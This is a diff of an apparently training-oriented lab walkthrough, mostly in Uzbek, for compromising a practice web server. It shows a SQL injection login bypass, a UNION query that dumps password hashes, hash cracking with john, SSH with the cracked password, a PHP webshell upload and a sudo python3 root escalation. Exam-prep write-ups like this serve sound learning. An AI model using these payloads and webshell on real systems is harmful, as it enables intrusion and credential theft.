@@ -16,37 +16,41 @@ nmap -sV -p- 172.20.0.10 172.20.0.20 172.20.0.30
 
 ---
 
-## 1) web-01 (172.20.0.10) — SQLi + upload → www-data → root
+## 1) web-01 (172.20.0.10) — web SQLi → hash → crack → SSH → root
 
-**Enum:** `dirb http://172.20.0.10 /root/dirs.txt` → `/index.php`, `/search.php`, `/dashboard.php`, `/uploads/`.
+Bu mashina **oson emas**: web zaifligidan foydalanib parol HASH'ini sizib
+chiqarasiz, uni buzasiz (crack), so'ng shu parol bilan SSH qilasiz.
 
-**a) SQLi — login bypass:**
-```
-username: admin'-- -
-password: (istalgan)
-```
-`dashboard.php`ga admin sifatida kirasiz.
-
-**b) SQLi — creds dump (UNION):** `search.php?q=` 2 ustunli (name, price):
+**Enum:** homepage'da ko'rsatkich yo'q — kataloglarni topish kerak:
 ```bash
-curl "http://172.20.0.10/search.php?q=%25' UNION SELECT username,password FROM users-- -"
-# -> sysadmin : Ac3m3S3rv3r!
+dirb http://172.20.0.10 /root/dirs.txt      # -> /search.php (yashirin), /dashboard.php, /uploads/
 ```
 
-**c) Unrestricted upload → RCE:** dashboard'da fayl turi tekshirilmaydi. PHP webshell yuklang:
+**a) SQLi (UNION) — parol HASH'larini dump qilish:** `search.php?q=` 2 ustunli (name, price):
 ```bash
-echo '<?php system($_GET["c"]); ?>' > sh.php
-# admin cookie olamiz, so'ng yuklaymiz:
-curl -c cj -d "username=admin'-- -&password=x" http://172.20.0.10/index.php
-curl -b cj -F "file=@sh.php" http://172.20.0.10/dashboard.php
-curl "http://172.20.0.10/uploads/sh.php?c=id"          # -> www-data
-curl "http://172.20.0.10/uploads/sh.php?c=cat /var/www/html/user.txt"
+curl "http://172.20.0.10/search.php?q=%25'%20UNION%20SELECT%20username,password%20FROM%20users--%20-"
+# -> admin    : $1$acme01$LKXfufFStU2JIHhZ8jBW2/
+#    sysadmin : $1$acme02$uiKoWRDnmr5mUs9ngQm3C.   (md5crypt — ochiq matn EMAS!)
+#    editor   : $1$acme03$xE1wR2RXoF42CJ0i6pHPh/
 ```
-➡️ **USER flag:** `EJPT{w3b_upl04d_rce_www_data}`
 
-**d) Privesc — sysadmin + sudo python3 (GTFOBins):**
+**b) Hash'ni buzish (john + wordlist):**
+```bash
+echo 'sysadmin:$1$acme02$uiKoWRDnmr5mUs9ngQm3C.' > h.txt
+john --wordlist=/root/wordlist.txt h.txt
+john --show h.txt          # -> sysadmin:Ac3m3S3rv3r!
+```
+
+**c) SSH — buzilgan parol bilan foothold:**
 ```bash
 sshpass -p 'Ac3m3S3rv3r!' ssh sysadmin@172.20.0.10
+cat /var/www/html/user.txt
+```
+➡️ **USER flag:** `EJPT{w3b_upl04d_rce_www_data}`
+> (Muqobil yo'l: `dashboard.php`da fayl upload → PHP webshell → `www-data` — xuddi shu user flag.)
+
+**d) Privesc — sudo python3 (GTFOBins):**
+```bash
 sudo -l                                     # (root) NOPASSWD: /usr/bin/python3
 sudo python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 cat /root/root.txt
